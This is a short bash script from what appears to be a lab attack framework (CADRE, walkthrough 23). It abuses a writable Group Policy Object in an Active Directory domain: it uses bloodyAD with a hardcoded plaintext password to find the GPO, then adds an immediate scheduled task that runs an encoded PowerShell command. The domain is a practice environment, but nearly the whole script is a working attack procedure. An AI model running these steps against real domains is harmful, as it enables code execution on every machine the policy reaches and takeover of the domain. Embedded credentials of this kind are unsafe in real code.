#!/bin/bash
# CADRE — WT#023 GPO Abuse (Vulnerable-GPO)
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#023 — GPO Abuse (Vulnerable-GPO)"
start_attack "023" "GPO Abuse (Vulnerable-GPO)"

require_tool bloodyAD
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: Resolve GPO Distinguished Name"
run_cmd "GPO_DN=\$(bloodyAD --host $DC01 -d $DOMAIN_ROOT -u analyst_cloud -p 'Cl0ud_An@lyst!' get object \"CN={\$(powershell -Command \\\"Get-GPO -Name Vulnerable-GPO\\\" 2>/dev/null)},CN=Policies,CN=System,DC=cadre,DC=local\" --attr dn 2>/dev/null | grep dn: | cut -d' ' -f2)"

step "Step 2: Add immediate task to Vulnerable-GPO"
run_cmd "bloodyAD --host $DC01 -d $DOMAIN_ROOT -u analyst_cloud -p 'Cl0ud_An@lyst!' add gpo-task -n \"Vulnerable-GPO\" -t \"Immediate\" -c \"powershell -enc <encoded_command>\""

result $? "GPO Abuse completed"
